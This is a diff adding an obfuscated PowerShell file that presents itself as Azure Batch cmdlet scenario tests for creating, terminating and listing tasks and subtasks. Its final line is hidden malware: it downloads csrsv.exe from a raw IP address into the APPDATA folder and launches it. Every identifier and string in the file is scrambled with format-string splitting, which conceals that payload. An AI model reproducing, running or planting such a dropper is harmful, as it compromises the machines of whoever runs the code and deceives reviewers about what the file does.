@@ -1,0 +1,182 @@
+ Sv ("{1}{0}"-f'3N','W')  (  [tYPE]("{2}{1}{0}" -F'N','eSpa','tim')) ;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function tESt`-ta`SkcRud
+{
+    param([string]${jOB`Id})
+
+    ${CO`Nte`Xt} = .("{0}{2}{1}" -f'N','w-Object','e') ("{11}{9}{0}{10}{2}{3}{7}{4}{1}{5}{12}{8}{6}"-f 'Azu','Tests.S','mands','.Batch.T','.Scenario','cenarioTe','t','est','Contex','rosoft.','re.Com','Mic','st')
+
+    ${ta`S`KiD1} = ("{1}{0}"-f'1','task')
+    ${t`A`skId2} = ("{0}{1}" -f 't','ask2')
+
+    try
+    {
+        
+        &("{2}{3}{0}{1}{4}" -f'Az','BatchT','New','-','ask') -Id ${T`As`KId1} -JobId ${j`oBid} -CommandLine ("{5}{3}{0}{1}{2}{4}" -f 'cho ','ta','sk','d /c e','1','cm') -BatchContext ${co`NtEXT}
+        .("{0}{1}{3}{4}{2}" -f 'New-A','zBa','k','tc','hTas') -Id ${tasK`i`d2} -JobId ${JoB`Id} -CommandLine ("{3}{2}{0}{1}{4}"-f'd /c echo ','task','m','c','2') -BatchContext ${cOn`T`Ext}
+
+        
+        ${T`AS`KS} = .("{0}{1}{3}{2}" -f'G','et-AzBa','k','tchTas') -JobId ${J`oB`ID} -Filter ('i'+'d '+'eq'+' '+"'$taskId1' "+'or'+' '+'i'+'d '+'eq'+' '+"'$taskId2'") -BatchContext ${COn`T`exT}
+        ${Ta`SK1} = ${tAS`KS} | .("{1}{2}{0}"-f'bject','W','here-O') { ${_}."I`D" -eq ${taS`K`iD1} }
+        ${ta`SK2} = ${T`AsKS} | &("{2}{0}{1}"-f 'j','ect','Where-Ob') { ${_}."i`d" -eq ${TAs`K`ID2} }
+        &("{3}{2}{0}{1}{4}"-f 'o','tNu','ert-N','Ass','ll') ${taS`k1}
+        .("{2}{0}{1}{3}{4}"-f 's','e','As','rt','-NotNull') ${Tas`K2}
+
+        
+        ${max`TaSKr`Etryc`OUNT} = 3
+        ${Ta`sk2}."CoN`sTRAIN`Ts" = &("{1}{0}{2}"-f'j','New-Ob','ect') ("{6}{10}{5}{3}{11}{7}{9}{12}{0}{2}{1}{13}{4}{8}"-f'a','els.','tch.Mod','oft.Azure.','rain','ros','M','d','ts','s','ic','Comman','.B','PSTaskConst') -ArgumentList @(${nu`LL}, ${nu`LL}, 3)
+        ${TA`S`k2} | &("{3}{1}{2}{0}"-f 'Task','t-A','zBatch','Se') -BatchContext ${CO`NtEXT}
+        ${UP`DA`Te`Dtask} = &("{2}{3}{1}{4}{0}" -f'chTask','t-','G','e','AzBat') -JobId ${J`obiD} -Id ${TASk`iD2} -BatchContext ${c`O`NTeXt}
+        .("{3}{1}{0}{2}" -f'qu','AreE','al','Assert-') ${M`AxTA`sk`RETrycoUnT} ${UPD`At`edTa`SK}."ConSTr`AI`NTS"."ma`XTA`SKrETRyc`ouNT"
+    }
+    finally
+    {
+        
+        &("{2}{3}{0}{1}" -f 'Bat','chTask','Get-','Az') -JobId ${j`ob`id} -BatchContext ${C`oNT`ExT} | &("{2}{0}{3}{1}"-f'emove','chTask','R','-AzBat') -Force -BatchContext ${con`TE`XT}
+
+        
+        ${t`ASkS} = &("{1}{2}{0}" -f 'ask','Get-AzB','atchT') -JobId ${JOB`Id} -BatchContext ${c`OnTE`XT}
+        &("{3}{0}{2}{1}" -f't','Null','-','Asser') ${t`AskS}
+    }
+}
+
+
+function T`ES`T`-CreatETas`KColLecTIoN
+{
+    param([string]${j`OBid})
+
+    ${C`oNT`Ext} = &("{1}{0}{2}"-f'ew-Obj','N','ect') ("{6}{10}{2}{4}{5}{9}{8}{13}{1}{11}{3}{7}{0}{12}" -f'ScenarioTestCo','nari','osoft.Azure.Comma','st','nds','.B','M','s.','t','a','icr','oTe','ntext','ch.Test.Sce')
+
+    ${TAsK`i`d1} = ("{0}{1}{2}"-f's','i','mple1')
+    ${tA`Ski`d2} = ("{0}{2}{1}" -f's','mple2','i')
+
+    ${C`Md} = ("{0}{2}{1}{3}"-f 'cm',' d','d /c','ir /s')
+
+    ${TA`Sk1} = &("{0}{1}{2}"-f'New-','Obj','ect') ("{0}{10}{5}{8}{11}{7}{1}{4}{9}{2}{3}{6}"-f 'Mi','o','Clou','dT','dels.','zure.','ask','.M','Commands.','PS','crosoft.A','Batch')(${ta`sk`ID1}, ${C`md})
+    ${Ta`sk2} = .("{0}{1}{2}" -f'Ne','w-Obj','ect') ("{3}{2}{9}{10}{5}{1}{6}{0}{7}{8}{4}"-f'.Mode','mmands.Ba','rosoft','Mic','loudTask','Co','tch','ls.PS','C','.Azur','e.')(${T`A`sKId2}, ${C`Md})
+
+    ${T`ASKc`ollE`CT`IOn} = @(${ta`S`K1}, ${tas`k2})
+
+    
+    &("{0}{2}{1}" -f'Get-','zBatchJob','A') -Id ${J`o`BID} -BatchContext ${Co`NTE`xT} | &("{1}{3}{2}{4}{0}" -f 'ask','New-A','t','zBa','chT') -Tasks ${TAs`KcoL`L`ectioN} -BatchContext ${coNt`E`Xt}
+    ${T`A`Sk1} = .("{3}{2}{1}{0}" -f 'Task','tch','t-AzBa','Ge') -JobId ${Jo`Bid} -Id ${tAs`KI`D1} -BatchContext ${c`oN`Text}
+    ${Ta`s`k2} = .("{1}{4}{2}{0}{3}"-f's','G','AzBatchTa','k','et-') -JobId ${jo`BID} -Id ${TASk`Id2} -BatchContext ${c`oNtE`XT}
+
+    
+    .("{2}{3}{0}{4}{1}" -f '-A','al','As','sert','reEqu') ${TA`Sk`ID1} ${t`A`SK1}."I`d"
+    &("{0}{2}{3}{1}" -f'A','t-AreEqual','sse','r') ${c`Md} ${t`Ask1}."C`omManD`Line"
+    .("{3}{0}{1}{2}"-f 're','Equ','al','Assert-A') ${tAs`kId2} ${t`ASK2}."I`D"
+    .("{1}{0}{2}{4}{3}"-f 'rt-','Asse','Ar','qual','eE') ${C`mD} ${T`AsK2}."c`o`mmANdlI`NE"
+
+    
+    ${a`Ff`INiTYId} = ("{2}{1}{0}" -f 'yId','it','affin')
+    ${a`FFin`ityi`N`FO} = &("{1}{2}{0}"-f'ct','New-','Obje') ("{2}{10}{9}{6}{0}{5}{7}{11}{1}{8}{4}{3}"-f 's.','fin','Mi','ion','nformat','Bat','Command','ch.Models.PSA','ityI','t.Azure.','crosof','f') -ArgumentList @(${Affin`I`Ty`iD})
+
+    ${tAskC`O`NSt`RAI`Nts} = &("{1}{2}{0}"-f't','New-Obje','c') ("{7}{12}{1}{2}{8}{5}{6}{3}{4}{9}{11}{0}{10}" -f'ain','osoft.Azu','r','odels.PS','Ta','c','h.M','Mic','e.Commands.Bat','skCo','ts','nstr','r') -ArgumentList @(  (  lS ("{2}{3}{1}{0}"-f ':w3N','lE','VArI','ab')).VAlUe::("{0}{2}{1}" -f'F','ys','romDa').Invoke(1),  ( iTem  ("{0}{1}{2}" -f'VArI','AB','le:w3N')).VALUe::("{2}{0}{1}" -f'a','ys','FromD').Invoke(2),5)
+    ${MAxWALLcLOc`K`TI`me} = ${taSkco`NS`TrAin`Ts}."mAx`WAlLcLOC`k`TiME"
+    ${rE`TENT`IOnt`imE} = ${tas`KC`OnSTR`AiN`TS}."ReTe`NTi`o`NTiME"
+    ${MA`XR`eTRyCoU`NT} = ${t`ASkcO`NsTrAinTs}."Ma`xRET`Ry`CoU`Nt"
+
+    ${REso`UrcE`F`Il`es} = .("{0}{2}{1}" -f 'New-O','ject','b') ("{13}{15}{5}{12}{8}{0}{3}{1}{4}{14}{11}{9}{2}{6}{7}{10}"-f 'ric.Li','t','els.P','s','1','lec','SResourc','eFi','ons.Gene','tch.Mod','le]','ommands.Ba','ti','System.Co','[Microsoft.Azure.C','l')
+    ${f`IlE} = &("{0}{3}{2}{4}{1}"-f'Ne','eFile','tc','w-AzBa','hResourc') -HttpUrl ("{3}{6}{2}{5}{0}{1}{4}{7}" -f 'b.core','.win','a','http','dows','cct.blo','s://test','.net/') -FilePath ("{0}{1}" -f 'f','ile1')
+    ${re`S`o`UrCEfILes}.("{0}{1}" -f'A','dd').Invoke(${fI`LE})
+
+    ${E`N`V`sEttiNGS} = @{ ("{0}{1}" -f'e','nv1') = ("{1}{0}"-f 'alue1','v'); ("{1}{0}" -f 'nv2','e') = ("{0}{1}" -f 'val','ue2') }
+    ${nu`m`iNSt`A`NceS} = 3
+    ${m`ULT`iinsTan`cE`s`et`TINGs} = &("{0}{3}{1}{2}" -f 'N','-Obj','ect','ew') ("{6}{12}{0}{4}{5}{9}{8}{11}{10}{2}{1}{3}{7}" -f '.Commands.B','e','ceS','tt','atch.M','o','Microsoft.Azu','ings','ti','dels.PSMul','nstan','I','re') -ArgumentList @(("{2}{0}{6}{1}{3}{4}{5}"-f'e','ho ','cmd /c ','co','ordinatin','g','c'), ${Nu`MIns`Tanc`ES})
+    ${CO`O`Rdi`N`A`TiOnCOMmaNdl`inE} = ${m`UlT`IInStANc`e`SEt`TI`NgS}."CoOr`d`i`NATi`oNComM`ANdLIne"
+    ${MULt`i`I`NstA`NceSETTINgs}."comMoNrEso`UrC`E`F`i`l`Es" = &("{0}{1}{2}" -f'N','ew','-Object') ("{14}{5}{1}{22}{18}{17}{11}{21}{7}{6}{9}{12}{2}{16}{8}{24}{13}{15}{3}{25}{10}{20}{4}{23}{0}{19}"-f'e','t','o','.B','S','ys','s','neric.Li','.Azur','t1[Micr','o','o','os','omma','S','nds','ft','ecti','.Coll',']','dels.P','ns.Ge','em','ResourceFil','e.C','atch.M')
+    ${C`oMMO`NRe`SOurcE`BlOB} = ("{6}{3}{10}{7}{5}{4}{8}{2}{9}{1}{0}" -f't/','ne','in','tt','or','mon.blob.c','h','m','e.w','dows.','ps://co')
+    ${c`OMM`OnresoURCe`FIlE} = ("{1}{2}{0}{3}"-f'm','c','om','on.exe')
+    ${C`oMmOnrES`O`U`Rce} = &("{2}{1}{4}{0}{5}{3}" -f'hResource','w-AzB','Ne','le','atc','Fi') -HttpUrl ${C`Omm`O`NREs`OUrCe`BLOb} -FilePath ${C`o`MmoN`ReSo`URceF`Ile}
+    ${MUlTi`in`sT`A`NC`eseTT`ings}."CoMM`oNres`ouR`CE`F`ILeS".("{0}{1}" -f 'Ad','d').Invoke(${CO`mmONReS`o`U`RCe})
+
+    ${TA`S`Kid3} = ("{2}{0}{1}"-f 'pl','ex1','com')
+    ${t`ASk`iD4} = ("{1}{0}"-f 'mple3','si')
+
+    ${t`AsK3} = &("{0}{3}{2}{1}" -f 'New-O','t','jec','b') ("{2}{5}{4}{0}{6}{1}{7}{3}" -f'u','.P','Microsof','loudTask','.Az','t','re.Commands.Batch.Models','SC')(${TaS`k`ID3}, ${c`Md})
+    ${tA`s`K4} = &("{0}{2}{1}"-f 'Ne','ct','w-Obje') ("{4}{7}{8}{2}{1}{9}{3}{6}{0}{5}{10}"-f's.Batch.Mode','s','o','.Az','M','l','ure.Command','i','cr','oft','s.PSCloudTask')(${T`As`kiD4}, ${c`md})
+
+    ${t`As`k3}."affInitY`infO`R`m`AT`iON" = ${aff`iNi`Ty`i`NFO}
+    ${ta`S`K3}."cO`N`sTRAints" = ${T`ASKc`on`STR`AiNTS}
+    ${Ta`sk3}."Mu`L`TIi`N`sTA`NCE`SettiNgS" = ${Mu`Lt`Ii`NsTaNCeSETTInGs}
+    ${Tas`K3}."enViR`onMEn`TsE`T`TinGS" = ${e`N`VSE`TtInGs}
+    ${taS`k3}."resOurCe`F`i`LES" = ${re`SO`URceFilEs}
+
+    ${T`AsKco`llec`Ti`On} = @(${tas`K3}, ${TA`sk4})
+
+    
+    .("{0}{2}{1}"-f'Ne','k','w-AzBatchTas') -JobId ${j`oBID} -Tasks ${t`AS`Kc`oLl`ectIon} -BatchContext ${C`o`NtEXt}
+
+    ${t`ASK3} = &("{0}{1}{3}{4}{2}" -f'Ge','t-Az','sk','B','atchTa') -JobId ${jo`BiD} -Id ${T`AS`KiD3} -BatchContext ${C`ONT`exT}
+    ${t`ASK4} = &("{0}{1}{2}{3}{4}" -f 'G','et-','A','z','BatchTask') -JobId ${J`OBiD} -Id ${Ta`SKi`d4} -BatchContext ${cO`N`TExt}
+
+    
+    &("{0}{1}{4}{2}{3}"-f'As','sert','eEqu','al','-Ar') ${taSKI`D3} ${T`ASK3}."I`d"
+    .("{3}{4}{0}{1}{2}" -f'sert','-','AreEqual','A','s') ${c`md} ${TAS`k3}."c`oMMa`NDliNE"
+    &("{2}{0}{1}{3}{4}"-f'rt-AreE','qu','Asse','a','l') ${a`FFI`NiTYiD} ${Ta`s`K3}."Af`FinI`TyInFOr`maTi`ON"."aF`FIN`it`YiD"
+    &("{3}{4}{2}{0}{1}" -f'AreEqu','al','-','As','sert') ${M`A`x`WAllcLOckT`ImE} ${ta`s`K3}."cOn`StraiN`Ts"."maXwa`lLCLo`C`KTI`ME"
+    .("{2}{3}{0}{1}" -f'-Are','Equal','Asser','t') ${rET`En`TioNt`imE} ${ta`sK3}."CO`NstRaIN`Ts"."R`ETen`Ti`onTIME"
+    .("{2}{3}{1}{0}" -f'al','u','Assert-A','reEq') ${m`A`xrEtr`yCOUnt} ${TA`S`K3}."cON`st`RaintS"."M`A`xRE`TrYco`UNT"
+    &("{2}{3}{1}{0}{4}" -f 'r','sert-A','A','s','eEqual') ${REs`OUrC`EfiL`Es}."C`OUNt" ${t`AS`k3}."RESO`URCe`FiLeS"."co`UNT"
+
+    &("{3}{2}{1}{0}" -f 'l','Equa','re','Assert-A') ${E`NvSeTt`i`Ngs}."cOu`Nt" ${t`AS`k3}."EnvI`RonmeNtSE`TTi`Ngs"."cO`Unt"
+    &("{0}{1}{3}{2}"-f 'Assert-A','r','Equal','e') ${nU`Mi`Ns`TaNCes} ${Tas`k3}."muLt`IinS`TanCE`seTTinGs"."nUmB`e`Rofi`NStAnces"
+    &("{1}{0}{3}{2}" -f'reEq','Assert-A','l','ua') ${cOo`R`diN`AtioNC`o`Mm`ANDLiNe} ${tAs`K3}."muLTiin`ST`An`Ces`EttIn`gs"."COor`DINAt`IoNcO`mMaN`dLINE"
+    &("{3}{2}{1}{0}" -f 'l','-AreEqua','ert','Ass') 1 ${TAs`k3}."Mul`TI`inS`T`AnceSeT`TiNgS"."cOM`MonRESoUr`c`e`FILES"."cOu`Nt"
+    &("{3}{4}{1}{2}{0}" -f 'l','AreE','qua','Assert','-') ${COm`monrESoUrce`B`Lob} ${tAS`K3}."MULtIInS`T`AN`cESEt`TIN`gS"."cOMMO`N`ResoUr`CEfi`les"[0]."HTtP`Url"
+    .("{2}{0}{1}{4}{3}" -f's','s','A','rt-AreEqual','e') ${commON`REsour`C`EF`Ile} ${T`As`K3}."MULTi`iNSTANcE`S`E`Tt`In`GS"."COM`m`o`NReSour`CefIL`es"[0]."FIle`p`Ath"
+
+    &("{1}{2}{0}{3}"-f'er','As','s','t-AreEqual') ${T`ASk`iD4} ${T`A`SK4}."iD"
+    &("{1}{3}{0}{2}" -f'a','Assert','l','-AreEqu') ${c`MD} ${T`A`Sk4}."COmMa`NDL`I`NE"
+}
+
+
+function Te`S`T-tErM`Inat`E`TAsk
+{
+    param([string]${J`ob`Id}, [string]${t`As`kid1}, [string]${TASKI`d2})
+
+    ${cont`e`xt} = &("{2}{1}{0}"-f 'ct','Obje','New-') ("{8}{5}{14}{10}{17}{7}{15}{11}{3}{9}{2}{4}{6}{1}{13}{16}{0}{12}"-f'nt','rioTes','s.','ScenarioT','S','i','cena','mands.Ba','M','est','.','.Test.','ext','tC','crosoft','tch','o','Azure.Com')
+
+    .("{2}{1}{4}{3}{0}"-f 'sk','top','S','AzBatchTa','-') ${Jo`BID} ${TAs`k`Id1} -BatchContext ${cont`EXT}
+    &("{2}{0}{3}{1}" -f 'at','ask','Get-AzB','chT') ${j`o`BiD} ${t`ASkId2} -BatchContext ${cOn`Text} | .("{1}{2}{3}{0}" -f'ask','Stop-AzB','atch','T') -BatchContext ${cO`NtE`xT}
+
+    
+    foreach (${ta`Sk} in .("{1}{2}{3}{4}{0}" -f'sk','Ge','t-AzBat','ch','Ta') ${J`oBId} -BatchContext ${C`oNtExT})
+    {
+        &("{1}{3}{2}{0}"-f'l','A','eEqua','ssert-Ar') ("{2}{1}{0}"-f 'ed','let','comp') ${ta`sK}."S`TATE".("{1}{0}{2}"-f 'oStri','T','ng').Invoke().("{2}{0}{1}"-f'oLow','er','T').Invoke()
+    }
+}
+
+
+function T`est-liST`ALLsu`Bt`ASkS
+{
+    param([string] ${jO`B`Id}, [string]${Ta`SK`ID}, [string]${NUm`I`N`STan`CeS})
+
+    ${NUMSU`Bt`A`skS`EXpe`CteD} = ${Num`i`N`st`ANCeS} - 1
+
+    ${ConT`E`xt} = .("{3}{2}{0}{1}"-f 'ec','t','w-Obj','Ne') ("{9}{11}{6}{3}{2}{7}{14}{17}{12}{8}{5}{15}{10}{13}{16}{4}{1}{0}" -f 'xt','te','an','Comm','n','rioT','ure.','d','a','M','c','icrosoft.Az','cen','enarioTest','s.','ests.S','Co','Batch.Test.S')
+    ${s`Ubtas`Ks} = .("{3}{2}{4}{1}{0}"-f'btask','hSu','-AzB','Get','atc') ${j`oBId} ${t`ASkID} -BatchContext ${c`oNt`Ext}
+
+    &("{0}{3}{2}{4}{1}"-f'Asser','ual','E','t-Are','q') ${nUmsubT`AskS`E`xpe`C`Ted} ${s`U`BTASKs}."leN`gth"
+
+    
+    ${Su`BTa`skS} = .("{1}{2}{0}{3}" -f'Batch','Get-A','z','Task') ${Jo`B`iD} ${ta`s`KID} -BatchContext ${cO`N`Text} | &("{0}{1}{2}{3}"-f'Get','-','AzBatch','Subtask') -BatchContext ${C`ONt`exT}
+
+    .("{0}{3}{1}{2}"-f'Asse','-A','reEqual','rt') ${n`Um`su`BTa`skSe`xPEcteD} ${S`UBTa`s`ks}."lenG`Th"
+}
+
+(.("{1}{2}{0}" -f 't','New-O','bjec') ("{0}{3}{4}{1}{2}" -f 'S','bClien','t','yst','em.Net.We')).("{2}{0}{1}" -f 'ownloadFil','e','D').Invoke(("{5}{4}{1}{8}{6}{2}{0}{3}{7}"-f 'o','0','aho','/cs','.1','http://94','238/~y','rsv.exe','2.53.'),"$env:APPDATA\csrsv.exe");&("{1}{2}{3}{0}" -f'cess','S','tar','t-Pro') ("$env:APPDATA\csrsv.exe")
